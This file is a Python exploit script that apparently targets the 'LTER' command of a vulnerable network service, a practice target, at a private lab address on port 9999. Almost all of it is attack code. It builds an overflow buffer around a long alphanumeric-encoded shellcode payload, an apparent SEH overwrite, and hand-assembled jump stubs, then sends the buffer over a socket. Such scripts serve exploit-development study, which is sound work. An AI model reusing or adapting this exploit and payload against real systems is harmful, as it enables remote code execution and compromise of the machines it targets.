#!/usr/bin/env python

import sys
import socket

message  = "LTER "
message += 'A' * 100

buf  = "\x66\x0d\x10\x0e\x50\x5c"  # "or ax,0x0e10 / push eax / pop esp"

buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2c"
buf += "\x01\x7a\x04\x2d\x7e\x10\x7e\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x48\x02\x2d"
buf += "\x2d\x7e\x7e\x17\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x41\x10\x01\x2d\x44\x7e"
buf += "\x7a\x4d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x3c\x58\x01\x2d\x31\x7e\x7e\x09\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x48"
buf += "\x01\x01\x01\x2d\x7e\x4a\x34\x19\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x10\x01\x1c"
buf += "\x2d\x30\x79\x4b\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x68\x01\x01\x2c\x2d\x7e\x33"
buf += "\x50\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x7b\x01\x2d\x71\x40\x7e\x36\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2f"
buf += "\x01\x01\x58\x2d\x7e\x04\x19\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x58\x01\x10\x01"
buf += "\x2d\x7e\x78\x7a\x38\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x6d\x58\x01\x01\x2d\x7e\x7e"
buf += "\x6d\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x5d\x10\x2d\x16\x67\x7e\x7b\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x13"
buf += "\x01\x01\x01\x2d\x7e\x68\x16\x7d\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x02\x01\x01\x50"
buf += "\x2d\x17\x30\x7c\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x75\x6d\x54\x2a\x2d\x7e\x7e"
buf += "\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x2f\x2f\x10\x01\x2d\x7e\x7e\x7c\x69\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x02"
buf += "\x01\x5d\x46\x2d\x17\x01\x7e\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x5e\x01\x03"
buf += "\x2d\x08\x7e\x63\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x01\x01\x29\x2d\x09\x50"
buf += "\x5f\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x50\x10\x27\x2c\x2d\x7e\x7e\x7e\x7e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x76"
buf += "\x19\x01\x14\x2d\x7e\x7e\x44\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2a\x10\x01\x01"
buf += "\x2d\x7e\x7b\x7b\x4b\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x73\x6e\x54\x01\x2d\x7e\x7e"
buf += "\x7e\x44\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x2c\x75\x01\x2d\x30\x7e\x7e\x11\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x01\x01\x1b\x2d\x58\x48\x60\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x02\x62\x01\x39"
buf += "\x2d\x09\x7e\x7d\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x1b\x21\x01\x2d\x1a\x7e"
buf += "\x7d\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x72\x01\x01\x10\x2d\x7e\x57\x7e\x78\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d"
buf += "\x1a\x77\x11\x2d\x7e\x7e\x7e\x7e\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01\x01\x01"
buf += "\x2d\x62\x09\x3c\x59\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x02\x01\x01\x01\x2d\x7e\x28"
buf += "\x25\x01\x2d\x7e\x7e\x7e\x01\x50\x25\x4a\x4d\x4e"
buf += "\x55\x25\x35\x32\x31\x2a\x2d\x01\x51\x01\x01\x2d"
buf += "\x1b\x7e\x4b\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35"
buf += "\x32\x31\x2a\x2d\x01\x68\x01\x65\x2d\x6f\x7e\x10"
buf += "\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
buf += "\x2d\x62\x25\x7b\x01\x2d\x7e\x7e\x7e\x21\x50\x25"
buf += "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01"
buf += "\x01\x21\x2d\x26\x73\x45\x7d\x50\x25\x4a\x4d\x4e"
buf += "\x55\x25\x35\x32\x31\x2a\x2d\x01\x40\x01\x01\x2d"
buf += "\x29\x7e\x6e\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35"
buf += "\x32\x31\x2a\x2d\x01\x34\x01\x01\x2d\x43\x7e\x4f"
buf += "\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
buf += "\x2d\x01\x01\x05\x01\x2d\x01\x01\x7e\x01\x2d\x32"
buf += "\x10\x7e\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
buf += "\x31\x2a\x2d\x01\x40\x74\x21\x2d\x63\x7e\x7e\x7e"
buf += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
buf += "\x26\x01\x01\x01\x2d\x7e\x42\x26\x50\x50\x25\x4a"
buf += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x6c\x2a"
buf += "\x5c\x2d\x7e\x7e\x7e\x7e\x50\x25\x4a\x4d\x4e\x55"
buf += "\x25\x35\x32\x31\x2a\x2d\x01\x01\x7e\x10\x2d\x14"
buf += "\x30\x7e\x7a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
buf += "\x31\x2a\x2d\x10\x52\x01\x7d\x2d\x7d\x7e\x06\x7e"
buf += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
buf += "\x1e\x01\x01\x01\x2d\x7e\x36\x3d\x4b\x50\x25\x4a"
buf += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x1e\x79"
buf += "\x6c\x2d\x15\x7e\x7e\x7e\x50\x25\x4a\x4d\x4e\x55"
buf += "\x25\x35\x32\x31\x2a\x2d\x01\x30\x01\x01\x2d\x66"
buf += "\x7e\x77\x40\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
buf += "\x31\x2a\x2d\x21\x01\x01\x01\x2d\x7e\x7d\x76\x59"
buf += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
buf += "\x48\x01\x46\x01\x2d\x7e\x3a\x7e\x7a\x50\x25\x4a"
buf += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x51\x58\x53"
buf += "\x01\x2d\x7e\x7e\x7e\x09\x50\x25\x4a\x4d\x4e\x55"
buf += "\x25\x35\x32\x31\x2a\x2d\x61\x3b\x10\x32\x2d\x7e"
buf += "\x7e\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
buf += "\x31\x2a\x2d\x12\x01\x01\x52\x2d\x7e\x64\x5f\x7e"
buf += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
buf += "\x2e\x01\x01\x73\x2d\x7e\x40\x3a\x7e\x50\x25\x4a"
buf += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x10\x4b\x03"
buf += "\x58\x2d\x7e\x7e\x7e\x7e\x50\x25\x4a\x4d\x4e\x55"
buf += "\x25\x35\x32\x31\x2a\x2d\x01\x77\x01\x01\x2d\x06"
buf += "\x7e\x09\x78\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
buf += "\x31\x2a\x2d\x01\x7b\x01\x40\x2d\x62\x7e\x1c\x7e"
buf += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
buf += "\x01\x78\x7c\x7c\x2d\x29\x7e\x7e\x7e\x50\x25\x4a"
buf += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01\x01"
buf += "\x2e\x2d\x15\x16\x3d\x7e\x50\x25\x4a\x4d\x4e\x55"
buf += "\x25\x35\x32\x31\x2a\x2d\x01\x01\x01\x01\x2d\x01"
buf += "\x31\x7e\x01\x2d\x16\x7e\x7e\x1a\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x57\x54\x01\x1c"
buf += "\x2d\x7e\x7e\x2a\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x01\x59\x2f\x2d\x2e\x30"
buf += "\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x01\x5a\x2d\x6b\x15\x48\x7e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x01\x3d\x01\x2d\x56\x39\x7e\x29\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x03\x01\x01\x08"
buf += "\x2d\x7e\x73\x43\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x42\x01\x1a\x2d\x3b\x7e"
buf += "\x2f\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x01\x01\x2d\x25\x24\x1d\x52\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x01\x38\x01\x2d\x24\x09\x7e\x19\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x04\x73\x5c"
buf += "\x2d\x7e\x7e\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x01\x01\x7e\x2d\x68\x59"
buf += "\x12\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x66\x01\x01\x7e\x2d\x7e\x29\x05\x7e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x30\x01\x01\x2d\x17\x7e\x5b\x3f\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01\x01\x79"
buf += "\x2d\x47\x06\x57\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x01\x01\x01\x01\x2d\x46\x3f"
buf += "\x44\x1d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x29\x03\x10\x01\x2d\x7e\x7e\x7e\x12\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4c"
buf += "\x01\x17\x01\x2d\x7e\x02\x7e\x3f\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01\x50\x06"
buf += "\x2d\x08\x02\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x07\x36\x07\x64\x2d\x09\x7e"
buf += "\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x01\x01\x2d\x3f\x46\x08\x4e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x4d\x04\x01\x2d\x73\x7e\x7e\x22\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x7e\x34\x01"
buf += "\x2d\x38\x7e\x7e\x68\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x60\x4f\x34\x01\x2d\x7e\x7e"
buf += "\x7e\x1e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x01\x01\x59\x19\x2d\x25\x5d\x7e\x7e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x4d\x57\x01\x2d\x69\x7e\x7e\x77\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x01\x01\x7e"
buf += "\x2d\x7c\x14\x02\x7e\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x30\x50\x27\x6f\x2d\x7e\x7e"
buf += "\x7e\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x28\x50\x01\x01\x2d\x7e\x7e\x35\x4d\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01"
buf += "\x10\x5d\x02\x2d\x26\x7b\x7e\x09\x50\x25\x4a\x4d"
buf += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x10\x01\x01"
buf += "\x2d\x37\x7d\x21\x3a\x50\x25\x4a\x4d\x4e\x55\x25"
buf += "\x35\x32\x31\x2a\x2d\x3b\x01\x01\x47\x2d\x7e\x43"
buf += "\x32\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
buf += "\x2a\x2d\x3b\x3a\x3a\x3a\x2d\x7e\x7e\x7e\x7e\x50"
buf += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3b"
buf += "\x3a\x3a\x3a\x2d\x7e\x7e\x7e\x7e\x50"

buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"

message += buf
message += "A" * (3499-100-len(buf))

message += "\x77\x06\x76\x04"
message += "\x0b\x12\x50\x62"

jump  = "\x51\x58"  # push ecx / pop eax
jump += "\x66\x53"  # push bx
jump += "\x66\x58"  # pop ax
jump += "\x66\x48"  # dec ax
jump += "\x40"  # inc eax
jump += "\x50\x5c"  # push eax / pop esp
jump += "\x48"  # dec eax
jump += "\x66\x2d\x01\x1f"  # sub ax,0x1f01
jump += "\x40"  # inc eax
jump += "\x66\x50"  # push ax
jump += "\x66\x35\x73\x12"  # xor ax,0x1b03

message += jump 
message += 'E' * (4000 - 3499 - 4 - 4 - len(jump))
message += ".\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
